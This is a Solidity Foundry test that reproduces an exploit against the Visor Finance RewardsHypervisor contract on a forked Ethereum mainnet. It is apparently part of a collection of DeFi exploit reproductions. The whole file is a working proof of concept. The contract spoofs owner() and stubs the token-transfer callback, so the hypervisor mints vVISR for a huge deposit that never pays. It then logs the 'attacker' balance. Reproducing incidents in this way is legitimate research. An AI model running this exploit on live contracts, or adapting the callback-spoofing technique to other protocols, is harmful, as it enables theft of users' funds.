// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
    IRewardsHypervisor irrewards = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
    IvVISR visr = IvVISR(0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 13_849_006); //fork mainnet at block 13849006
    }

    function testExploit() public {
        irrewards.deposit(100_000_000_000_000_000_000_000_000, address(this), msg.sender);
        // VISR_Balance =  visr.balanceOf(msg.sender);
        emit log_named_uint("Attacker VIST Balance", visr.balanceOf(msg.sender));
    }

    function owner() external returns (address) {
        return (address(this));
    }

    function delegatedTransferERC20(address token, address to, uint256 amount) external {}
}
